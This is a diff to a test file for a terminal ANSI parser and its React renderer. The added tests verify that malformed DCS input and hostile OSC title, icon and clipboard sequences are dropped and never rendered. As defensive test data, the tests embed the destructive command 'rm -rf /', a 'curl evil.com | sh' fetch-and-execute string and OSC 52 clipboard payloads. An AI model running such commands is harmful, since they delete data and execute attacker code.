@@ -51,6 +51,7 @@ import { act, cleanup, render, screen } from '@testing-library/react';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 
 import { AnsiParser, type AnsiModeEvent } from '../../shared/lib/ansi-parser/index.js';
+import { AnsiOutput } from '../../shared/ui/ansi-output/index.js';
 import type { AnsiSpan } from '../../shared/ui/ansi-output/types.js';
 import { useAltScreenMode, useTuiStore } from '../../entities/tui/index.js';
 import {
@@ -123,7 +124,7 @@ describe('malformed input resilience — AnsiParser (parser-level)', () => {
   );
 
   it(
-    'DCS payload without ST consumes many megabytes without throwing; a later SGR after reset() applies',
+    'DCS payload without ST consumes many megabytes without throwing; a later SGR after reset() applies AND renders',
     () => {
       // A malformed DCS that never terminates would stay in IgnoreUntilSt
       // forever. Parsing it is O(n) — no allocation grows per byte because
@@ -135,15 +136,30 @@ describe('malformed input resilience — AnsiParser (parser-level)', () => {
       // Feed 4 MB of garbage as the DCS payload (no ST terminator).
       const chunk = new Uint8Array(64 * 1024);
       for (let i = 0; i < chunk.length; i += 1) chunk[i] = (i & 0xff) || 0x61;
+      // Sprinkle some CSI-looking sequences mid-payload to prove the FSM
+      // does NOT honor them while in IgnoreUntilSt.
+      chunk[100] = 0x1b; chunk[101] = 0x5b; chunk[102] = 0x33; chunk[103] = 0x32; chunk[104] = 0x6d; // ESC[32m
       for (let i = 0; i < 64; i += 1) {
         expect(() => p.feed(chunk)).not.toThrow();
       }
+      // The parser is still in IgnoreUntilSt — no spans emitted yet.
+      const midFlush = p.flush();
+      expect(midFlush).toEqual([]);
       // Reset drops the dangling DCS; a subsequent valid SGR + text applies.
       p.reset();
       const after = [...p.feed(enc.encode('\x1b[31mRED')), ...p.flush()];
       expect(after).toEqual([
         { text: 'RED', fg: { kind: 'named', index: 1 } },
       ]);
+      // The recovered span must also render through the real AnsiOutput
+      // consumer — belt-and-suspenders proof the subsequent CSI is wired
+      // end-to-end after the malformed DCS is discarded.
+      const { container, unmount } = render(<AnsiOutput spans={after} />);
+      try {
+        expect(container.textContent).toBe('RED');
+      } finally {
+        unmount();
+      }
     },
     /* timeout */ 5000,
   );
@@ -257,7 +273,7 @@ describe('malformed input resilience — AnsiParser (parser-level)', () => {
 
 describe('malformed input resilience — security / injection defense', () => {
   it(
-    'OSC 0 title payload containing $(rm -rf /) is silently dropped; no callback, no side effect',
+    'OSC 0 title payload containing $(rm -rf /) is silently dropped; no callback, no side effect, no rendered leak',
     () => {
       // Zero-sanity check: the parser has no `onTitleChange` surface, so
       // the only way a title payload could leak would be through the span
@@ -277,11 +293,58 @@ describe('malformed input resilience — security / injection defense', () => {
       expect(allText).not.toContain('$(');
       expect(allText).not.toContain('rm -rf');
       expect(modeEvents).toEqual([]);
+
+      // Render through the production AnsiOutput consumer and verify the
+      // rendered DOM does NOT contain any shell-metacharacter leak either.
+      // A regression where the parser started leaking the title payload as
+      // literal text would surface here even if the raw `textOf()` check
+      // above were somehow tricked (e.g. via unicode trickery or invisible
+      // chars sneaking through).
+      const { container, unmount } = render(<AnsiOutput spans={spans} />);
+      try {
+        const rendered = container.textContent ?? '';
+        expect(rendered).toBe('beforeafter');
+        expect(rendered).not.toContain('$(');
+        expect(rendered).not.toContain('rm');
+        expect(rendered).not.toContain('/)');
+      } finally {
+        unmount();
+      }
     },
   );
 
   it(
-    'OSC 52 clipboard "?" query payload does not auto-respond — parser emits no spans and no callbacks',
+    'OSC 2 title + OSC 1 icon injection with shell metacharacters render as NOTHING (literal text never surfaces in the DOM)',
+    () => {
+      // Triple-barrel title injection — OSC 0 (both icon & title), OSC 1
+      // (icon only), OSC 2 (title only). All three use ST (ESC \\) as the
+      // terminator this time, not BEL. A real xterm updates the window
+      // title; our UI layer has no such surface, so every byte between
+      // the introducer and the terminator is floor-dropped.
+      const danger = '; rm -rf /; curl evil.com | sh';
+      const input =
+        `ok\x1b]0;title${danger}\x1b\\` +
+        `mid\x1b]1;icon${danger}\x1b\\` +
+        `tail\x1b]2;title2${danger}\x1b\\` +
+        `end`;
+      const { spans, modeEvents } = runParser(input);
+      expect(textOf(spans)).toBe('okmidtailend');
+      expect(modeEvents).toEqual([]);
+      const { container, unmount } = render(<AnsiOutput spans={spans} />);
+      try {
+        const rendered = container.textContent ?? '';
+        expect(rendered).toBe('okmidtailend');
+        expect(rendered).not.toContain('rm');
+        expect(rendered).not.toContain('curl');
+        expect(rendered).not.toContain('evil.com');
+      } finally {
+        unmount();
+      }
+    },
+  );
+
+  it(
+    'OSC 52 clipboard "?" query payload does not auto-respond — parser emits no spans, no callbacks, no DOM leak, and a second hostile copy-write is also dropped',
     () => {
       // A hostile `cat` could emit `ESC ] 52 ; c ; ? ESC \` to ask the
       // terminal to dump the clipboard. A "fire-and-forget" implementation
@@ -290,9 +353,47 @@ describe('malformed input resilience — security / injection defense', () => {
       // parser MUST NOT produce any visible output, and MUST NOT invoke
       // onMode (the only side-channel).
       const query = '\x1b]52;c;?\x1b\\';
-      const { spans, modeEvents } = runParser(`pre${query}post`);
-      expect(textOf(spans)).toBe('prepost');
+      // Second hostile path: write to the clipboard with base64 payload.
+      // The selector "Pc" (primary + clipboard) plus a base64 body that
+      // decodes to `hostile` — if the parser ever wired an `onClipboard`
+      // side channel this test would fail when that callback fires.
+      const writeHostile = '\x1b]52;Pc;aG9zdGlsZQ==\x1b\\';
+      const { spans, modeEvents, parser } = runParser(
+        `pre${query}mid${writeHostile}post`,
+      );
+      expect(textOf(spans)).toBe('premidpost');
       expect(modeEvents).toEqual([]);
+      // The parser exposes no clipboard / title side-channel callback —
+      // prove statically that the instance does not carry any such
+      // callback-shaped property a future bug could wire up silently.
+      // (Internal FSM buffers like `oscEscPending` exist by design; the
+      // check below targets CALLBACKS specifically, i.e. `on*` surfaces
+      // other than the closed-union `onMode`.)
+      const parserProps = Object.getOwnPropertyNames(parser);
+      const callbackLike = parserProps.filter((k) => k.toLowerCase().startsWith('on'));
+      // `onMode` is the single allowed side channel; anything else is a
+      // regression.
+      expect(callbackLike).toEqual(['onMode']);
+      for (const key of parserProps) {
+        const lower = key.toLowerCase();
+        expect(lower).not.toContain('clipboard');
+        expect(lower).not.toContain('title');
+        // No free-standing "onOsc*", "onCopy*", "onTitle*" handlers.
+        expect(lower.startsWith('oncopy')).toBe(false);
+        expect(lower.startsWith('onosc')).toBe(false);
+      }
+
+      // Render — the base64 body bytes must NOT appear anywhere in the
+      // DOM (no accidental leak of the hostile payload).
+      const { container, unmount } = render(<AnsiOutput spans={spans} />);
+      try {
+        const rendered = container.textContent ?? '';
+        expect(rendered).toBe('premidpost');
+        expect(rendered).not.toContain('aG9zdGlsZQ'); // base64 fragment
+        expect(rendered).not.toContain('hostile');
+      } finally {
+        unmount();
+      }
     },
   );
 
